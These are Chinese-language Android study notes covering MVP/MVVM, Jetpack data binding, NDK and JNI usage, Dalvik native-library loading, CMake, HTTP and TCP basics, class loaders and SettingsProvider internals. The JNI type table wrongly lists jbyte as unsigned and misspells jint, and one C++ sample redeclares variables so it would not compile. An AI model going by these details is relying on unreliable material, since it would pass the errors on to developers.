- 易于理解、开发速度快、可维护性高

## MVP

![] (<https://mmbiz.qpic.cn/mmbiz_png/zKFJDM5V3Wy5xbLTp6JMMdouZiavFxyYCLVgibsuVQFguBI8FBdZibLNfpvbpd6njkdGWdyR2UL6TzMOhKHFqLC0Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1>)

通过引入接口 BaseView，让相应的视图组件如 Activity，Fragment去实现 BaseView，把业务逻辑放在 presenter 层中，弱化 Model 只有跟 view 相关的操作都由 View 层去完成。

总结：

- 彻底解决了 MVC 中 View 和 Controller 傻傻分不清楚的问题
- 但是随着业务逻辑的增加，一个页面可能会非常复杂，UI 的改变是非常多，会有非常多的 case，这样就会造成 View 的接口会很庞大
- 更容易单元测试

## MVVM

![] (<https://mmbiz.qpic.cn/mmbiz_png/zKFJDM5V3Wy5xbLTp6JMMdouZiavFxyYCMygIDD6xo5djkq6Y3jZo53sT2A4kKNaz8JEVRwmUnTmcAwJm0pZVWg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1>)

在 MVP 中 View 和 Presenter 要相互持有，方便调用对方，而在 MVP 中 View 和 ViewModel 通过 Binding 进行关联，他们之前的关联处理通过  DataBinding 完成。

总结：

- 很好的解决了 MVC 和 MVP 的问题
- 视图状态较多，ViewModel 的构建和维护的成本都会比较高
- 但是由于数据和视图的双向绑定，导致出现问题时不太好定位来源

## Jetpack

### 1架构

![] (<https://developer.android.google.cn/topic/libraries/architecture/images/final-architecture.png>)

### 2使用示例

``build.gradle``

```textgroovy
android {
    ···
    dataBinding {
        enabled = true
    }
}
dependencies {
    ···
    implementation "androidx.fragment:fragment-ktx:$rootProject.fragmentVersion"
    implementation "androidx.lifecycle:lifecycle-extensions:$rootProject.lifecycleVersion"
    implementation "androidx.lifecycle:lifecycle-livedata-ktx:$rootProject.lifecycleVersion"
    implementation "androidx.lifecycle:lifecycle-viewmodel-ktx:$rootProject.lifecycleVersion"
}
```

``fragment_plant_detail.xml``

```textxml
<layout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools">

    <data>
        <variable
            name="viewModel"
            type="com.google.samples.apps.sunflower.viewmodels.PlantDetailViewModel" />
    </data>

    <androidx.constraintlayout.widget.ConstraintLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent">

        <TextView
            ···
            android:text="@{viewModel.plant.name}"/>

    </androidx.constraintlayout.widget.ConstraintLayout>
</layout>
```

``PlantDetailFragment.kt``

```textkotlin
class PlantDetailFragment : Fragment() {

    private val args: PlantDetailFragmentArgs by navArgs()
    private lateinit var shareText: String

    private val plantDetailViewModel: PlantDetailViewModel by viewModels {
        InjectorUtils.providePlantDetailViewModelFactory(requireActivity(), args.plantId)
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val binding = DataBindingUtil.inflate<FragmentPlantDetailBinding>(
                inflater, R.layout.fragment_plant_detail, container, false).apply {
            viewModel = plantDetailViewModel
            lifecycleOwner = this@PlantDetailFragment
        }

        plantDetailViewModel.plant.observe(this) { plant ->
            // 更新相关 UI
        }

        return binding.root
    }
}
```

``Plant.kt``

```textkotlin
data class Plant (
    val name: String
)
```

``PlantDetailViewModel.kt``

```textkotlin
class PlantDetailViewModel(
    plantRepository: PlantRepository,
    private val plantId: String
) : ViewModel() {

    val plant: LiveData<Plant>

    override fun onCleared() {
        super.onCleared()
        viewModelScope.cancel()
    }

    init {
        plant = plantRepository.getPlant(plantId)
    }
}
```

``PlantDetailViewModelFactory.kt``

```textkotlin
class PlantDetailViewModelFactory(
    private val plantRepository: PlantRepository,
    private val plantId: String
) : ViewModelProvider.NewInstanceFactory() {

    @Suppress("UNCHECKED_CAST")
    override fun <T : ViewModel> create(modelClass: Class<T>): T {
        return PlantDetailViewModel(plantRepository, plantId) as T
    }
}
```

``InjectorUtils.kt``

```textkotlin
object InjectorUtils {
    private fun getPlantRepository(context: Context): PlantRepository {
        ···
    }

    fun providePlantDetailViewModelFactory(
        context: Context,
        plantId: String
    ): PlantDetailViewModelFactory {
        return PlantDetailViewModelFactory(getPlantRepository(context), plantId)
    }
}
```

## NDK 开发
>
> NDK 全称是 Native Development Kit，是一组可以让你在 Android 应用中编写实现 C/C++ 的工具，可以在项目用自己写源代码构建，也可以利用现有的预构建库。

使用 NDK 的使用目的有：

- 从设备获取更好的性能以用于计算密集型应用，例如游戏或物理模拟
- 重复使用自己或其他开发者的 C/C++ 库，便利于跨平台。
- NDK 集成了譬如 OpenSL、Vulkan 等 API 规范的特定实现，以实现在 java 层无法做到的功能如提升音频性能等
- 增加反编译难度

## JNI 基础

### 数据类型

- 基本数据类型
  
| Java 类型 | Native 类型 | 符号属性 | 字长
|--|--|--|--
| boolean | jboolean | 无符号 | 8位
| byte | jbyte | 无符号 | 8位
| char | jchar | 无符号 | 16位
| short | jshort | 有符号 | 16位
| int | jnit | 有符号 | 32位
| long | jlong | 有符号 | 64位
| float | jfloat | 有符号 | 32位
| double | jdouble | 有符号 | 64位

- 引用数据类型

| Java 引用类型 | Native 类型 | Java 引用类型 | Native 类型
|--|--|--|--
| All objects | jobject | char[]  | jcharArray
| java.lang.Class | jclass | short[]  | jshortArray
| java.lang.String | jstring | int[]  | jintArray
| Object[]  | jobjectArray | long[]  | jlongArray
| boolean[]  | jbooleanArray | float[]  | jfloatArray
| byte[]  | jbyteArray | double[]  | jdoubleArray
| java.lang.Throwable | jthrowable

### String 字符串函数操作

| JNI 函数 | 描述
|--|--
| GetStringChars / ReleaseStringChars | 获得或释放一个指向 Unicode 编码的字符串的指针（指 C/C++ 字符串）
| GetStringUTFChars / ReleaseStringUTFChars | 获得或释放一个指向 UTF-8 编码的字符串的指针（指 C/C++ 字符串）
| GetStringLength | 返回 Unicode 编码的字符串的长度
| getStringUTFLength | 返回 UTF-8 编码的字符串的长度
| NewString | 将 Unicode 编码的 C/C++ 字符串转换为 Java 字符串
| NewStringUTF | 将 UTF-8 编码的 C/C++ 字符串转换为 Java 字符串
| GetStringCritical / ReleaseStringCritical | 获得或释放一个指向字符串内容的指针(指 Java 字符串)
| GetStringRegion | 获取或者设置 Unicode 编码的字符串的指定范围的内容
| GetStringUTFRegion | 获取或者设置 UTF-8 编码的字符串的指定范围的内容

### 常用 JNI 访问 Java 对象方法

``MyJob.java``

```textjava
package com.example.myjniproject;

public class MyJob {

    public static String JOB_STRING = "my_job";
    private int jobId;

    public MyJob(int jobId) {
        this.jobId = jobId;
    }

    public int getJobId() {
        return jobId;
    }
}
```text
``native-lib.cpp``
```textc++
#include <jni.h>

extern "C"
JNIEXPORT jint JNICALL
Java_com_example_myjniproject_MainActivity_getJobId(JNIEnv *env, jobject thiz, jobject job) {

    // 根据实力获取 class 对象
    jclass jobClz = env->GetObjectClass(job);
    // 根据类名获取 class 对象
    jclass jobClz = env->FindClass("com/example/myjniproject/MyJob");

    // 获取属性 id
    jfieldID fieldId = env->GetFieldID(jobClz, "jobId", "I");
    // 获取静态属性 id
    jfieldID sFieldId = env->GetStaticFieldID(jobClz, "JOB_STRING", "Ljava/lang/String;");

    // 获取方法 id
    jmethodID methodId = env->GetMethodID(jobClz, "getJobId", "()I");
    // 获取构造方法 id
    jmethodID  initMethodId = env->GetMethodID(jobClz, "<init>", "(I)V");

    // 根据对象属性 id 获取该属性值
    jint id = env->GetIntField(job, fieldId);
    // 根据对象方法 id 调用该方法
    jint id = env->CallIntMethod(job, methodId);

    // 创建新的对象
    jobject newJob = env->NewObject(jobClz, initMethodId, 10);

    return id;
}
```

## 1NDK 开发

### 基础开发流程

- 在 java 中声明 native 方法

```textjava
public class MainActivity extends AppCompatActivity {

    // Used to load the 'native-lib' library on application startup.
    static {
        System.loadLibrary("native-lib");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("MainActivity", stringFromJNI());
    }

    private native String stringFromJNI();
}
```

- 在 ``app/src/main`` 目录下新建 cpp 目录，新建相关 cpp 文件，实现相关方法（AS 可用快捷键快速生成）

``native-lib.cpp``

```text
#include <jni.h>

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_myjniproject_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());
}
```

>- 函数名的格式遵循遵循如下规则：Java_包名_类名_方法名。
>- extern "C" 指定采用 C 语言的命名风格来编译，否则由于 C 与 C++ 风格不同，导致链接时无法找到具体的函数
>- JNIEnv*：表示一个指向 JNI 环境的指针，可以通过他来访问 JNI 提供的接口方法
>- jobject：表示 java 对象中的 this
>- JNIEXPORT 和 JNICALL：JNI 所定义的宏，可以在 jni.h 头文件中查找到

- 通过 CMake 或者 ndk-build 构建动态库

### System.loadLibrary()

``java/lang/System.java``:

```textjava
@CallerSensitive
public static void load(String filename) {
    Runtime.getRuntime().load0(Reflection.getCallerClass(), filename);
}
```

- 调用 ``Runtime`` 相关 native 方法

``java/lang/Runtime.java``:

```textjava
private static native String nativeLoad(String filename, ClassLoader loader, Class<?> caller);
```

- native 方法的实现如下：

``dalvik/vm/native/java_lang_Runtime.cpp``:

```textcpp
static void Dalvik_java_lang_Runtime_nativeLoad(const u4* args,
    JValue* pResult)
{
    ···
    bool success;

    assert(fileNameObj != NULL);
    // 将 Java 的 library path String 转换到 native 的 String
    fileName = dvmCreateCstrFromString(fileNameObj);

    success = dvmLoadNativeCode(fileName, classLoader, &reason);
    if (!success) {
        const char* msg = (reason != NULL) ? reason : "unknown failure";
        result = dvmCreateStringFromCstr(msg);
        dvmReleaseTrackedAlloc((Object*) result, NULL);
    }
    ···
}
```

- ``dvmLoadNativeCode`` 函数实现如下：

``dalvik/vm/Native.cpp``

```textcpp
bool dvmLoadNativeCode(const char* pathName, Object* classLoader,
        char** detail)
{
    SharedLib* pEntry;
    void* handle;
    ···
    *detail = NULL;

    // 如果已经加载过了，则直接返回 true
    pEntry = findSharedLibEntry(pathName);
    if (pEntry != NULL) {
        if (pEntry->classLoader != classLoader) {
            ···
            return false;
        }
        ···
        if (!checkOnLoadResult(pEntry))
            return false;
        return true;
    }

    Thread* self = dvmThreadSelf();
    ThreadStatus oldStatus = dvmChangeStatus(self, THREAD_VMWAIT);
    // 把.so mmap 到进程空间，并把 func 等相关信息填充到 soinfo 中
    handle = dlopen(pathName, RTLD_LAZY);
    dvmChangeStatus(self, oldStatus);
    ···
    // 创建一个新的 entry
    SharedLib* pNewEntry;
    pNewEntry = (SharedLib*) calloc(1, sizeof(SharedLib));
    pNewEntry->pathName = strdup(pathName);
    pNewEntry->handle = handle;
    pNewEntry->classLoader = classLoader;
    dvmInitMutex(&pNewEntry->onLoadLock);
    pthread_cond_init(&pNewEntry->onLoadCond, NULL);
    pNewEntry->onLoadThreadId = self->threadId;

    // 尝试添加到列表中
    SharedLib* pActualEntry = addSharedLibEntry(pNewEntry);

    if (pNewEntry != pActualEntry) {
        ···
        freeSharedLibEntry(pNewEntry);
        return checkOnLoadResult(pActualEntry);
    } else {
        ···
        bool result = true;
        void* vonLoad;
        int version;
        // 调用该 so 库的 JNI_OnLoad 方法
        vonLoad = dlsym(handle, "JNI_OnLoad");
        if (vonLoad == NULL) {
            ···
        } else {
            // 调用 JNI_Onload 方法，重写类加载器。
            OnLoadFunc func = (OnLoadFunc)vonLoad;
            Object* prevOverride = self->classLoaderOverride;

            self->classLoaderOverride = classLoader;
            oldStatus = dvmChangeStatus(self, THREAD_NATIVE);
            ···
            version = (*func)(gDvmJni.jniVm, NULL);
            dvmChangeStatus(self, oldStatus);
            self->classLoaderOverride = prevOverride;

            if (version != JNI_VERSION_1_2 && version != JNI_VERSION_1_4 &&
                version != JNI_VERSION_1_6)
            {
                ···
                result = false;
            } else {
                ···
            }
        }

        if (result)
            pNewEntry->onLoadResult = kOnLoadOkay;
        else
            pNewEntry->onLoadResult = kOnLoadFailed;

        pNewEntry->onLoadThreadId = 0;

        // 释放锁资源 
        dvmLockMutex(&pNewEntry->onLoadLock);
        pthread_cond_broadcast(&pNewEntry->onLoadCond);
        dvmUnlockMutex(&pNewEntry->onLoadLock);
        return result;
    }
}
```

<!-- ### native 方法调用原理
- 虚拟机调用一个方法时，发现如果这是一个 native 方法，则使用 Method 对象中的nativeFunc 函数指针对象调用。

``dalvik2/vm/interp/Stack.cpp``:
```textcpp
Object* dvmInvokeMethod(Object* obj, const Method* method,
    ArrayObject* argList, ArrayObject* params, ClassObject* returnType,
    bool noAccessCheck)
{
    ···
    if (dvmIsNativeMethod(method)) {
        TRACE_METHOD_ENTER(self, method);
        (*method->nativeFunc)((u4*)self->interpSave.curFrame, &retval, method, self);
        TRACE_METHOD_EXIT(self, method);
    } else {
        dvmInterpret(self, method, &retval);
    }
    ···
}
```text -->

## CMake 构建 NDK 项目
>
> CMake 是一个开源的跨平台工具系列，旨在构建，测试和打包软件，从 Android Studio 2.2 开始，Android Sudio 默认地使用 CMake 与 Gradle 搭配使用来构建原生库。

启动方式只需要在 ``app/build.gradle`` 中添加相关：

```textgroovy
android {
    ···
    defaultConfig {
        ···
        externalNativeBuild {
            cmake {
                cppFlags ""
            }
        }

        ndk {
            abiFilters 'arm64-v8a', 'armeabi-v7a'
        }
    }
    ···
    externalNativeBuild {
        cmake {
            path "CMakeLists.txt"
        }
    }
}
```

然后在对应目录新建一个 ``CMakeLists.txt`` 文件：

```texttxt
# 定义了所需 CMake 的最低版本
cmake_minimum_required(VERSION 3.4.1)

# add_library() 命令用来添加库
# native-lib 对应着生成的库的名字
# SHARED 代表为分享库
# src/main/cpp/native-lib.cpp 则是指明了源文件的路径。
add_library( # Sets the name of the library.
        native-lib

        # Sets the library as a shared library.
        SHARED

        # Provides a relative path to your source file(s).
        src/main/cpp/native-lib.cpp)

# find_library 命令添加到 CMake 构建脚本中以定位 NDK 库，并将其路径存储为一个变量。
# 可以使用此变量在构建脚本的其他部分引用 NDK 库
find_library( # Sets the name of the path variable.
        log-lib

        # Specifies the name of the NDK library that
        # you want CMake to locate.
        log)

# 预构建的 NDK 库已经存在于 Android 平台上，因此，无需再构建或将其打包到 APK 中。
# 由于 NDK 库已经是 CMake 搜索路径的一部分，只需要向 CMake 提供希望使用的库的名称，并将其关联到自己的原生库中

# 要将预构建库关联到自己的原生库
target_link_libraries( # Specifies the target library.
        native-lib

        # Links the target library to the log library
        # included in the NDK.
        ${log-lib})
···
```text
- [CMake 命令详细信息文档] (https://cmake.org/cmake/help/latest/manual/cmake-commands.7.html)

## 常用的 Android NDK 原生 API
| 支持 NDK 的 API 级别 | 关键原生 API | 包括
|--|--|--
| 3 | Java 原生接口 |  #include <jni.h>
| 3 | Android 日志记录 API | #include <android/log.h>
| 5 | OpenGL ES 2.0 | #include <GLES2/gl2.h><br>#include <GLES2/gl2ext.h>
| 8 | Android 位图 API | #include <android/bitmap.h>
| 9 | OpenSL ES | #include <SLES/OpenSLES.h><br>#include <SLES/OpenSLES_Platform.h><br>#include <SLES/OpenSLES_Android.h><br>#include <SLES/OpenSLES_AndroidConfiguration.h>
| 9 | 原生应用 API | #include <android/rect.h><br>#include <android/window.h><br>#include<android/native_activity.h><br>···
| 18 | OpenGL ES 3.0 | #include <GLES3/gl3.h><br>#include <GLES3/gl3ext.h>
| 21 | 原生媒体 API | #include <media/NdkMediaCodec.h><br>#include <media/NdkMediaCrypto.h><br>···
| 24 | 原生相机 API | #include <camera/NdkCameraCaptureSession.h><br>#include <camera/NdkCameraDevice.h><br>···
| ···

# 计算机网络基础
## 网络体系的分层结构
| 分层 | 说明
| -- | --
| 应用层（HTTP、FTP、DNS、SMTP 等）| 定义了如何包装和解析数据，应用层是 http 协议的话，则会按照协议规定包装数据，如按照请求行、请求头、请求体包装，包装好数据后将数据传至运输层
| 运输层（TCP、UDP 等） | 运输层有 TCP 和 UDP 两种，分别对应可靠和不可靠的运输。在这一层，一般都是和 Socket 打交道，Socket 是一组封装的编程调用接口，通过它，我们就能操作 TCP、UDP 进行连接的建立等。这一层指定了把数据送到对应的端口号
| 网络层（IP 等） | 这一层IP协议，以及一些路由选择协议等等，所以这一层的指定了数据要传输到哪个IP地址。中间涉及到一些最优线路，路由选择算法等
| 数据链路层（ARP）| 负责把 IP 地址解析为 MAC 地址，即硬件地址，这样就找到了对应的唯一的机器
| 物理层 | 提供二进制流传输服务，也就是真正开始通过传输介质（有线、无线）开始进行数据的传输

## Http 相关
### 请求报文与响应报文
- 请求报文
  
| 名称 | 组成
| -- | --
| 请求行 | 请求方法如 post/get、请求路径 url、协议版本等
| 请求头 | 即 header，里面包含了很多字段
| 请求体 | 发送的数据

- 响应报文

| 名称 | 组成
| -- | --
| 状态行 | 状态码如 200、协议版本等
| 响应头 | 即返回的 header
| 响应体 | 响应的正文数据 |

### 缓存机制
![] (https://upload-images.jianshu.io/upload_images/1445840-c3465ef477e24416.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/930/format/webp)

- Cache-control 主要包含以下几个字段：

| 字段 | 说明
| -- | --
| private | 只有客户端可以缓存
| public | 客户端和代理服务器都可以缓存
| max-age | 缓存的过期时间
| no-cache | 需要使用对比缓存来验证缓存数据，如果服务端确认资源没有更新，则返回304，取本地缓存即可，如果有更新，则返回最新的资源。做对比缓存与 Etag 有关。
| no-store | 这个字段打开，则不会进行缓存，也不会取缓存

- Etag：当客户端发送第一次请求时服务端会下发当前请求资源的标识码 Etag ，下次再请求时，客户端则会通过 header 里的 If-None-Match 将这个标识码 Etag 带上，服务端将客户端传来的 Etag 与最新的资源 Etag 做对比，如果一样，则表示资源没有更新，返回304。

### Https
Https 保证了我们数据传输的安全，Https = Http + Ssl，之所以能保证安全主要的原理就是利用了非对称加密算法，平常用的对称加密算法之所以不安全，是因为双方是用统一的密匙进行加密解密的，只要双方任意一方泄漏了密匙，那么其他人就可以利用密匙解密数据。

### Http 2.0
Okhttp 支持配置使用 Http 2.0 协议，Http2.0 相对于 Http1.x 来说提升是巨大的，主要有以下几点：
- **二进制格式**：http1.x 是文本协议，而 http2.0 是二进制以帧为基本单位，是一个二进制协议，一帧中除了包含数据外同时还包含该帧的标识：Stream Identifier，即标识了该帧属于哪个 request,使得网络传输变得十分灵活。
- **多路复用**：多个请求共用一个TCP连接，多个请求可以同时在这个 TCP 连接上并发，一个是解决了建立多个 TCP 连接的消耗问题，一个也解决了效率的问题。
- **header 压缩**：主要是通过压缩 header 来减少请求的大小，减少流量消耗，提高效率。
- **支持服务端推送**

## TCP/IP
IP（Internet Protocol）协议提供了主机和主机间的通信，为了完成不同主机的通信，我们需要某种方式来唯一标识一台主机，这个标识，就是著名的 IP 地址。通过IP地址，IP 协议就能够帮我们把一个数据包发送给对方。

TCP 的全称是 Transmission Control Protocol，TCP 协议在 IP 协议提供的主机间通信功能的基础上，完成这两个主机上进程对进程的通信。

### 三次握手
所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。

三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换 TCP 窗口大小信息。在 socket 编程中，客户端执行 connect() 时。将触发三次握手。

![] (https://raw.githubusercontent.com/HIT-Alibaba/interview/master/img/tcp-connection-made-three-way-handshake.png)

- 第一次握手(SYN=1, seq=x):

客户端发送一个 TCP 的 SYN 标志位置 1 的包，指明客户端打算连接的服务器的端口，以及初始序号 X，保存在包头的序列号 (Sequence Number) 字段里。

发送完毕后，客户端进入 ``SYN_SEND`` 状态。

- 第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1):

服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK 标志位均为 1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN 加1，即 X+1。 发送完毕后，服务器端进入 ``SYN_RCVD`` 状态。

- 第三次握手(ACK=1，ACKnum=y+1)

客户端再次发送确认包(ACK)，SYN 标志位为 0，ACK 标志位为 1，并且把服务器发来 ACK 的序号字段 +1，放在确定字段中发送给对方，并且在数据段放写 ISN 的 +1

发送完毕后，客户端进入 ESTABLISHED 状态，当服务器端接收到这个包时，也进入 ESTABLISHED 状态，TCP 握手结束。

### 四次挥手
TCP 的连接的拆除需要发送四个包，因此称为四次挥手(Four-way handshake)，也叫做改进的三次握手。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。

![] (https://raw.githubusercontent.com/HIT-Alibaba/interview/master/img/tcp-connection-closed-four-way-handshake.png)

- 第一次挥手(FIN=1，seq=x)

假设客户端想要关闭连接，客户端发送一个 FIN 标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。

发送完毕后，客户端进入 FIN_WAIT_1 状态。

- 第二次挥手(ACK=1，ACKnum=x+1)

服务器端确认客户端的 FIN 包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。

发送完毕后，服务器端进入 CLOSE_WAIT 状态，客户端接收到这个确认包之后，进入 FIN_WAIT_2 状态，等待服务器端关闭连接。

- 第三次挥手(FIN=1，seq=y)

服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。

发送完毕后，服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。

- 第四次挥手(ACK=1，ACKnum=y+1)

客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入 TIME_WAIT状态，等待可能出现的要求重传的 ACK 包。

服务器端接收到这个确认包之后，关闭连接，进入 CLOSED 状态。

客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum Segment Lifetime）之后，没有收到服务器端的 ACK ，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入 CLOSED 状态。

### TCP 与 UDP 的区别
| 区别点    | TCP      | UDP    |
| -------- | -------- | ------ |
| 连接性   | 面向连接 | 无连接 |
| 可靠性   | 可靠     | 不可靠|
| 有序性   | 有序     | 无序   |
| 面向     | 字节流     | 报文（保留报文的边界） |
| 有界性   | 有界     | 无界   |
| 流量控制 | 有（滑动窗口） | 无     |
| 拥塞控制 | 有（慢开始、拥塞避免、快重传、快恢复）       | 无 |
| 传输速度 | 慢       | 快     |
| 量级     | 重量级   | 轻量级 |
| 双工性     | 全双工   | 一对一、一对多、多对一、多对多 |
| 头部 | 大（20-60 字节）       | 小（8 字节）     |
| 应用 | 文件传输、邮件传输、浏览器等 | 即时通讯、视频通话等     |

## Socket
Socket 是一组操作 TCP/UDP 的 API，像 HttpURLConnection 和 Okhttp 这种涉及到比较底层的网络请求发送的，最终当然也都是通过 Socket 来进行网络请求连接发送，而像 Volley、Retrofit 则是更上层的封装。

### 使用示例
使用 socket 的步骤如下：
- 创建 ServerSocket 并监听客户连接；
- 使用 Socket 连接服务端；
- 通过 Socket.getInputStream()/getOutputStream() 获取输入输出流进行通信。

```textjava
public class EchoClient {

    private final Socket mSocket;

    public EchoClient(String host, int port) throws IOException {
        // 创建 socket 并连接服务器
        mSocket = new Socket(host, port);
    }
 
    public void run() {
        // 和服务端进行通信
        Thread readerThread = new Thread(this::readResponse);
        readerThread.start();
 
        OutputStream out = mSocket.getOutputStream();
        byte[]  buffer = new byte[1024] ;
        int n;
        while ((n = System.in.read(buffer)) > 0) {
            out.write(buffer, 0, n);
        }
    }

    private void readResponse() {
        try {
            InputStream in = mSocket.getInputStream();
            byte[]  buffer = new byte[1024] ;
            int n;
            while ((n = in.read(buffer)) > 0) {
                System.out.write(buffer, 0, n);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[]  argv) {
        try {
            // 由于服务端运行在同一主机，这里我们使用 localhost
            EchoClient client = new EchoClient("localhost", 9877);
            client.run();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

## 类加载器

![] (<https://img-blog.csdn.net/20161021101447117?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center>)

## 双亲委托模式

```text
某个特定的类加载器在接到加载类的请求时，首先将加载任务委托给父类加载器，依次递归，如果父类加载器可以完成类加载任务，就成功返回；只有父类加载器无法完成此加载任务时，才自己去加载。

因为这样可以避免重复加载，当父亲已经加载了该类的时候，就没有必要子 ClassLoader 再加载一次。如果不使用这种委托模式，那我们就可以随时使用自定义的类来动态替代一些核心的类，存在非常大的安全隐患。
```

## DexPathList

DexClassLoader 重载了 ``findClass`` 方法，在加载类时会调用其内部的 DexPathList 去加载。DexPathList 是在构造 DexClassLoader 时生成的，其内部包含了 DexFile。

``DexPathList.java``

```textjava
···
public Class findClass(String name) {
    for (Element element : dexElements) {
        DexFile dex = element.dexFile;
        if (dex != null) {
            Class clazz = dex.loadClassBinaryName(name, definingContext);
            if (clazz != null) {
                return clazz;
            }
        }
    }
    return null;
}
···
```

## [Snippet] 通过反射设置语言

```text
try {
    Class iActivityManager = Class.forName("android.app.IActivityManager");
    Class activityManagerNative = Class.forName("android.app.ActivityManagerNative");
    Method getDefault = activityManagerNative.getDeclaredMethod("getDefault");
    Object objIActMag = getDefault.invoke(activityManagerNative);
    Method getConfiguration = iActivityManager.getDeclaredMethod("getConfiguration");
    Configuration config = (Configuration) getConfiguration.invoke(objIActMag);
    config.locale = locale;
    Class clzConfig = Class.forName("android.content.res.Configuration");
    java.lang.reflect.Field userSetLocale = clzConfig.getField("userSetLocale");
    userSetLocale.set(config, true);
    Class[]  clzParams = {Configuration.class};
    Method updateConfiguration = iActivityManager.getDeclaredMethod("updateConfiguration", clzParams);
    updateConfiguration.invoke(objIActMag, config);
    BackupManager.dataChanged("com.android.providers.settings");
} catch (Exception e) {
    e.printStackTrace();
}
```

## SettingsProvider分析，settings provider 中的数据保存在什么地方?

```text
adb shell cat /data/system/users/0/settings_system.xml

frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java
private static final String SETTINGS_FILE_GLOBAL = "settings_global.xml";
private static final String SETTINGS_FILE_SYSTEM = "settings_system.xml";
private static final String SETTINGS_FILE_SECURE = "settings_secure.xml";
private static final String SETTINGS_FILE_SSAID = "settings_ssaid.xml";
private static final String SETTINGS_FILE_CONFIG = "settings_config.xml";

frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsState.java
//写入
private void doWriteState() {
    boolean wroteState = false;
    final int version;
    final ArrayMap<String, Setting> settings;

    synchronized (mLock) {
        version = mVersion;
        settings = new ArrayMap<>(mSettings);
        mDirty = false;
        mWriteScheduled = false;
    }

    synchronized (mWriteLock) {
        if (DEBUG_PERSISTENCE) {
            Slog.i(LOG_TAG, "[PERSIST START] ");
        }

        AtomicFile destination = new AtomicFile(mStatePersistFile, mStatePersistTag);
        FileOutputStream out = null;
        try {
            out = destination.startWrite();

            XmlSerializer serializer = Xml.newSerializer();
            serializer.setOutput(out, StandardCharsets.UTF_8.name());
            serializer.setFeature("http://xmlpull.org/v1/doc/features.html#indent-output",
                    true);
            serializer.startDocument(null, true);
            serializer.startTag(null, TAG_SETTINGS);
            serializer.attribute(null, ATTR_VERSION, String.valueOf(version));

            final int settingCount = settings.size();
            for (int i = 0; i < settingCount; i++) {
                Setting setting = settings.valueAt(i);

                if (setting.isTransient()) {
                    if (DEBUG_PERSISTENCE) {
                        Slog.i(LOG_TAG, "[SKIPPED PERSISTING] " + setting.getName());
                    }
                    continue;
                }

                writeSingleSetting(mVersion, serializer, setting.getId(), setting.getName(),
                        setting.getValue(), setting.getDefaultValue(), setting.getPackageName(),
                        setting.getTag(), setting.isDefaultFromSystem());

                if (DEBUG_PERSISTENCE) {
                    Slog.i(LOG_TAG, "[PERSISTED] " + setting.getName() + "="
                            + setting.getValue());
                }
            }

            serializer.endTag(null, TAG_SETTINGS);
            serializer.endDocument();
            destination.finishWrite(out);

            wroteState = true;

            if (DEBUG_PERSISTENCE) {
                Slog.i(LOG_TAG, "[PERSIST END] ");
            }
        } catch (Throwable t) {
            Slog.wtf(LOG_TAG, "Failed to write settings, restoring backup", t);
            destination.failWrite(out);
        } finally {
            IoUtils.closeQuietly(out);
        }
    }

    if (wroteState) {
        synchronized (mLock) {
            addHistoricalOperationLocked(HISTORICAL_OPERATION_PERSIST, null);
        }
    }
}

//读取
private void parseSettingsLocked(XmlPullParser parser) throws IOException, XmlPullParserException {
    mVersion = Integer.parseInt(parser.getAttributeValue(null, ATTR_VERSION));
    final int outerDepth = parser.getDepth();
    int type;
    while ((type = parser.next()) != XmlPullParser.END_DOCUMENT && (type != XmlPullParser.END_TAG || parser.getDepth() > outerDepth)) {
        if (type == XmlPullParser.END_TAG || type == XmlPullParser.TEXT) {
            continue;
        }
        String tagName = parser.getName();
        if (tagName.equals(TAG_SETTING)) {
            String id = parser.getAttributeValue(null, ATTR_ID);
            String name = parser.getAttributeValue(null, ATTR_NAME);
            String value = getValueAttribute(parser, ATTR_VALUE, ATTR_VALUE_BASE64);
            String packageName = parser.getAttributeValue(null, ATTR_PACKAGE);
            String defaultValue = getValueAttribute(parser, ATTR_DEFAULT_VALUE, ATTR_DEFAULT_VALUE_BASE64);
            String tag = null;
            boolean fromSystem = false;
            if (defaultValue != null) {
                fromSystem = Boolean.parseBoolean(parser.getAttributeValue(null, ATTR_DEFAULT_SYS_SET));
                tag = getValueAttribute(parser, ATTR_TAG, ATTR_TAG_BASE64);
            }
            mSettings.put(name, new Setting(name, value, defaultValue, packageName, tag, fromSystem, id));
            if (DEBUG_PERSISTENCE) {
                Slog.i(LOG_TAG, "[RESTORED]  " + name + "=" + value);
            }
        }
    }
}

